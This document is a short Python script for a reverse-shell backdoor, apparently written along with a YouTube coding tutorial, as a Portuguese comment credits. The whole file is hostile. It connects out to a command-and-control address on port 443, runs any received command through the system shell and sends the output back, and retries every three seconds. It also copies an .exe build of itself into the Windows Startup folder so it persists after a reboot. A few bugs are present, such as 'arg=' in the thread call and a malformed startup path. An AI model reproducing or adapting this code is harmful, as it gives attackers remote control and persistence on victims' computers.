import socket
import subprocess
import threading
import time
import os

ccip = "127.0.0.1"
ccport = 443

def outrun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    os.system("copy {} \"\APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))

def conn(ccip, ccport):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ccip, ccport))
        return client
    except Exception as error:
        print(error)

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        stdout = proc.stdout.read()
        stderr = proc.stderr.read()
        output = stdout + stderr
        client.send(output + b"\n")
    except Exception as error:
        print(error)

def cli(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == '/sair':
                return
            else:
                threading.Thread(target=cmd, arg=(client, data)).start()
    except Exception as error:
        client.close()

if __name__ == "__main__":
    outrun()
    while True:
        client = conn(ccip, ccport)
        if client:
            cli(client)
        else:
            time.sleep(3)

# tutorial do coder https://www.youtube.com/watch?v=nLLeXRIOWLM&t=1813s